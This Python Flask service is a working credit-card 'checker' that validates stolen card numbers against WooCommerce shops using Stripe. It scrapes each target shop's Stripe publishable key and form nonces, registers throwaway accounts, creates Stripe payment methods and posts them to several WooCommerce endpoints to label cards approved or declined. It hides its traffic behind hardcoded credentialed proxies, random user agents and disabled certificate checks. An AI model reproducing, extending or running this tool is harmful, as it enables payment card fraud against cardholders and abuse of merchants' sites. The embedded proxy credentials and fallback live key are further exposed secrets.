from flask import Flask, request, jsonify
import requests
import re
import random
import string
import uuid
import time
import logging
import os
from fake_useragent import UserAgent

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Disable SSL warnings (for stealth/speed)
requests.packages.urllib3.disable_warnings()

# Hardcoded Proxy List
PROXY_LIST = [
    "http://QHx7z4LAe710hGHQ:pTIqtSnBECb9HmpZ@geo.g-w.info:10080",
    "http://7rSMKmVZmrEs6rSv:2aEPRTkVEOATS0sB@geo.g-w.info:10080",
    "http://BGI9SeYej1sJ5fHu:NDp0rWiUotYY25ud@geo.g-w.info:10080",
    "http://aBX7AipylAgSKum4:CwVD19RjOwibs3Xw@geo.g-w.info:10080",
    "http://KXLizV3GaYrE79HP:pgUULzTvnJHGdLFI@geo.g-w.info:10080",
    "http://JCxjRlxVC5a9dgET:igainAzJ8NGOs21N@geo.g-w.info:10080",
    "http://vpWA1ixCySTygsWq:z2xbGgC1sXJmdw34@geo.g-w.info:10080",
    "http://1r0JpDP1l0DtgrKa:01M4OkwRjQSMCqJV@geo.g-w.info:10080",
    "http://kBhzCKGXScZKFDTi:D7rfZwIEqyo9qjNa@geo.g-w.info:10080",
    "http://BqGTQUNdjGSrQiEP:3MPbEqFynI0Zk3sp@geo.g-w.info:10080"
]

def make_request(method, url, session=None, proxy=None, **kwargs):
    """
    Wrapper for requests to handle proxy failover automatically.
    If proxy fails, it instantly retries without proxy.
    """
    proxies = None
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
    
    try:
        if session:
            response = session.request(method, url, proxies=proxies, timeout=15, verify=False, **kwargs)
        else:
            response = requests.request(method, url, proxies=proxies, timeout=15, verify=False, **kwargs)
        return response, "direct" if not proxy else "proxy"
        
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.SSLError, requests.exceptions.ProxyConnectionError) as e:
        logger.warning(f"Proxy ({proxy}) failed for {url}: {e}. Retrying without proxy.")
        # Retry without proxy
        try:
            if session:
                response = session.request(method, url, proxies=None, timeout=15, verify=False, **kwargs)
            else:
                response = requests.request(method, url, proxies=None, timeout=15, verify=False, **kwargs)
            return response, "failover_direct"
        except Exception as e:
            logger.error(f"Direct request also failed: {e}")
            return None, "error"
    except Exception as e:
        logger.error(f"Request error: {e}")
        return None, "error"

def get_stripe_key(domain, proxy=None):
    logger.debug(f"Fetching Stripe key for: {domain}")
    
    # Comprehensive list of paths where keys might be hiding
    paths = [
        "/my-account/add-payment-method/",
        "/checkout/",
        "/cart/",
        "/",
        "/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params"
    ]
    
    # Expanded regex patterns for Publishable Keys
    patterns = [
        r'pk_live_[a-zA-Z0-9_]{20,}',  # Standard match
        r'"publishableKey"\s*:\s*"((pk_live_[^"]+))"',  # JS Object
        r'"stripePublicKey"\s*:\s*"((pk_live_[^"]+))"', # Variable
        r'stripe\.key\s*=\s*["\']((pk_live_[^"\']+))["\']', # Assignment
        r'key["\']\s*:\s*["\']((pk_live_[^"\']+))["\']',  # Generic JSON
        r'data-stripe-key="((pk_live_[^"]+))"' # HTML Attribute
    ]

    for path in paths:
        url = f"https://{domain}{path}"
        resp, status = make_request('GET', url, proxy=proxy)
        
        if resp and resp.status_code == 200:
            content = resp.text
            for pattern in patterns:
                match = re.search(pattern, content)
                if match:
                    # Extract just the key in case the regex captured surrounding context
                    key_clean = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                    if key_clean:
                        logger.info(f"Found Stripe Key: {key_clean.group(0)}")
                        return key_clean.group(0)
    
    logger.debug("Key not found, using default.")
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content):
    """
    Advanced nonce extraction covering multiple WooCommerce versions.
    """
    # Ordered by specificity (most likely first)
    patterns = [
        # UPE (Unified Payment Experience) / Stripe Gateway newer versions
        r'"stripeIntentNonce"\s*:\s*"([^"]+)"',
        r'"add_payment_method_nonce"\s*:\s*"([^"]+)"',
        
        # Classic WooCommerce / Stripe
        r'wc-stripe-create-and-confirm-setup-intent["\']?\]\["nonce"\]\s*=\s*"([^"]+)"',
        r'wc_stripe_params[^}]*"nonce"\s*:\s*"([^"]+)"',
        r'wc_stripe_elements_params[^}]*"nonce"\s*:\s*"([^"]+)"',
        
        # Generic AJAX Nonces
        r'name="_ajax_nonce"[^>]*value="([^"]+)"',
        r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"',
        r'name="woocommerce-login-nonce"[^>]*value="([^"]+)"',
        
        # JS Variables
        r'var\s+wc_stripe_create_and_confirm_setup_intent_nonce\s*=\s*"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10,32})["\']', # Generic hex nonce
        r'_wpnonce["\']?\s*:\s*["\']([^"\']+)["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            return match.group(1)
            
    return None

def get_nonce(domain, session, proxy=None):
    """
    Tries multiple pages to find a valid nonce.
    """
    urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    for url in urls:
        resp, _ = make_request('GET', url, session=session, proxy=proxy)
        if resp and resp.status_code == 200:
            nonce = extract_nonce_from_page(resp.text)
            if nonce:
                logger.info(f"Found Nonce at {url}")
                return nonce
    return None

def register_account(domain, session, proxy=None):
    """
    Attempts to register a random account.
    Returns (Success: Bool, Message: String)
    """
    url = f"https://{domain}/my-account/"
    resp, _ = make_request('GET', url, session=session, proxy=proxy)
    
    if not resp or resp.status_code != 200:
        return False, "Could not load registration page"

    nonce = extract_nonce_from_page(resp.text)
    if not nonce:
        return False, "Could not find registration nonce"
    
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"{username}@temp-mail.org"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    
    reg_data = {
        'username': username,
        'email': email,
        'password': password,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
        'e_consent': 'yes' # GDPR compliance often needed
    }
    
    post_resp, _ = make_request('POST', url, session=session, proxy=proxy, data=reg_data)
    
    if post_resp and ('Log out' in post_resp.text or 'woocommerce-MyAccount-navigation' in post_resp.text):
        return True, "Registered"
    
    return False, "Registration failed"

def process_card(domain, ccx, proxy=None):
    ccx = ccx.strip()
    
    # Robust Card Parsing
    try:
        parts = ccx.split("|")
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Handle Year format (24 -> 2024, 2024 -> 2024)
        if len(yy) == 2:
            yy = "20" + yy
        elif len(yy) == 4:
            pass # keep as is
        else:
            return {"status": "ERROR", "response": "Invalid Year Format", "cc": ccx, "proxy": "N/A"}
            
    except IndexError:
        return {"status": "ERROR", "response": "Invalid Card Format. Use CC|MM|YY|CVV", "cc": ccx, "proxy": "N/A"}

    user_agent = UserAgent().random
    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    # 1. Get Stripe Publishable Key
    stripe_key = get_stripe_key(domain, proxy)
    
    # 2. Get Nonce
    nonce = get_nonce(domain, session, proxy)
    
    # 3. Optional Registration (Only if we want to test logged-in flows, 
    #    but often 'Add Payment Method' works with a valid nonce without login if guest checkout is enabled)
    #    We will proceed without forcing registration to avoid triggering bot defenses, 
    #    unless the specific site requires it. 
    
    if not nonce:
        # Try registering as a last resort to get a fresh session/nonce
        logger.info("Nonce not found, trying registration...")
        reg_success, _ = register_account(domain, session, proxy)
        if reg_success:
            nonce = get_nonce(domain, session, proxy)
            
    if not nonce:
        return {"status": "DECLINED", "response": "Failed to extract valid nonce from site", "cc": ccx, "proxy": proxy if proxy else "Direct"}

    # 4. Create Stripe Payment Method (Client-side simulation)
    payment_method_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10012', # Valid US Zip
        'billing_details[name]': 'Sahil Pro',
        'key': stripe_key,
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}',
        'time_on_page': str(random.randint(5000, 60000)),
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4())
    }

    pm_resp, _ = make_request(
        'POST',
        'https://api.stripe.com/v1/payment_methods',
        data=payment_method_data,
        headers={'User-Agent': user_agent, 'Referer': f'https://{domain}/'},
        proxy=proxy
    )

    if not pm_resp:
        return {"status": "DECLINED", "response": "Failed to connect to Stripe API", "cc": ccx, "proxy": proxy if proxy else "Direct"}

    pm_json = pm_resp.json()

    if 'id' not in pm_json:
        err = pm_json.get('error', {}).get('message', 'Unknown Stripe Error')
        logger.error(f"Stripe API Error: {err}")
        return {"status": "DECLINED", "response": err, "cc": ccx, "proxy": proxy if proxy else "Direct"}

    payment_method_id = pm_json['id']
    logger.info(f"Payment Method Created: {payment_method_id}")

    # 5. Send to WooCommerce (Server-side)
    
    # Prepare multiple endpoint/payload combinations to ensure compatibility
    endpoints = [
        # Method A: Unified Payment Experience / Newest Plugin
        {
            'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
            'payload': {
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce
            }
        },
        # Method B: Legacy / Older Plugin
        {
            'url': f'https://{domain}/?wc-ajax=wc_stripe_save_payment_method',
            'payload': {
                'payment_method': payment_method_id,
                'nonce': nonce
            }
        },
        # Method C: Admin AJAX Fallback
        {
            'url': f'https://{domain}/wp-admin/admin-ajax.php',
            'payload': {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                '_ajax_nonce': nonce
            }
        },
        # Method D: Add Payment Method Endpoint
        {
            'url': f'https://{domain}/my-account/add-payment-method/',
            'payload': {
                'wc_stripe_new_payment_method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_wpnonce': nonce
            }
        }
    ]

    for endpoint in endpoints:
        try:
            headers = {
                'User-Agent': user_agent,
                'Referer': f'https://{domain}/my-account/add-payment-method/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            logger.info(f"Trying endpoint: {endpoint['url']}")
            resp, status = make_request(
                'POST',
                endpoint['url'],
                session=session,
                proxy=proxy,
                data=endpoint['payload'],
                headers=headers
            )

            if not resp:
                continue

            # Parse JSON if possible
            try:
                data = resp.json()
            except:
                # Sometimes returns 200 OK with HTML on success, or raw text
                if "Payment method added" in resp.text or "Successfully added" in resp.text:
                    return {"status": "APPROVED", "response": "Payment method successfully added (HTML Response)", "cc": ccx, "proxy": status}
                logger.debug(f"Non-JSON response: {resp.text[:200]}")
                continue

            logger.debug(f"Endpoint Response: {data}")

            # Analyze Response
            if data.get('success'):
                result_data = data.get('data', {})
                if result_data.get('status') == 'succeeded':
                     return {"status": "APPROVED", "response": "Chargeable / Setup Succeeded", "cc": ccx, "proxy": status}
                
                # Some setups return success with status 'requires_action' (3DS), 
                # but for checking validity, getting this far often means the card is valid.
                # However, we will mark as DECLINED if 3DS is required for strict auth checking.
                if result_data.get('status') == 'requires_action':
                    return {"status": "DECLINED", "response": "3D Secure Required (Card Valid but Auth Needed)", "cc": ccx, "proxy": status}

            # Check for specific error messages that might indicate success in some weird plugin implementations
            if 'result' in data and data['result'] == 'success':
                 return {"status": "APPROVED", "response": "Gateway Success", "cc": ccx, "proxy": status}

            # Specific Error Handling
            if 'data' in data and 'error' in data['data']:
                msg = data['data']['error'].get('message', '').lower()
                if 'your card was declined' in msg or 'do not honor' in msg:
                    return {"status": "DECLINED", "response": "Declined", "cc": ccx, "proxy": status}
                if 'invalid' in msg:
                    return {"status": "DECLINED", "response": "Invalid Card Details", "cc": ccx, "proxy": status}

        except Exception as e:
            logger.error(f"Payment loop error: {e}")
            continue

    return {"status": "DECLINED", "response": "All payment attempts failed", "cc": ccx, "proxy": proxy if proxy else "Direct"}

@app.route('/')
def api_gateway():
    site = request.args.get('site')
    cc = request.args.get('cc')
    key = request.args.get('key')

    # Auth Check
    if key and key != "inferno":
        return jsonify({"error": "Unauthorized"}), 401

    # Validation
    if not site or not cc:
        return jsonify({"status": "ERROR", "response": "Missing site or cc"}), 400

    # Clean Domain
    domain = site.replace("https://", "").replace("http://", "").strip().split('/')[0]

    # Regex format check for CC
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
         return jsonify({"status": "ERROR", "response": "Invalid CC Format (Number|MM|YY|CVV)"}), 400

    # Select Proxy
    proxy_to_use = random.choice(PROXY_LIST)

    try:
        result = process_card(domain, cc, proxy=proxy_to_use)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Crash: {e}")
        return jsonify({"status": "ERROR", "response": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=False)
